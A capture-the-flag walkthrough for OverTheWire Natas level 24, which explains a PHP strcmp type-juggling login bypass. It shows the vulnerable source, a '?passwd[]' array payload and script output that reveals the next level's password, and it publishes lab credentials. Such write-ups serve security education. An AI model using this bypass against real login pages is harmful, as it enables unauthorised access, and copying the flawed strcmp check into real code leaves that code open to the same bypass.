# Natas24 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas24
Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
URL:      http://natas24.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- We need to provide correct password like in the previous level.

  ```
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
  <body>
  <h1>natas24</h1>
  <div id="content">
  
  Password:
  <form name="input" method="get">
      <input type="text" name="passwd" size=20>
      <input type="submit" value="Login">
  </form>
  
  <?php
      if(array_key_exists("passwd",$_REQUEST)){
          if(!strcmp($_REQUEST["passwd"],"<censored>")){
              echo "<br>The credentials for the next level are:<br>";
              echo "<pre>Username: natas25 Password: <censored></pre>";
          }
          else{
              echo "<br>Wrong!<br>";
          }
      }
      // morla / 10111
  ?>  
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

- The vulnerable code is:

```
if(!strcmp($_REQUEST["passwd"],"<censored>")){
```

So it **does** compare your input with the real password *exactly* using `strcmp`.

But the trick is:

If you submit an array instead of a string, strcmp() will return NULL, and !NULL is true in PHP. 

```
$ python3 natas24.py           
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd" };</script></head>
<body>
<h1>natas24</h1>
<div id="content">
Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>
<br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>   
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

- You can also do it manually by appending `?passwd[]test` to the URL.

---

## 🏁 Password for the next level

`Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
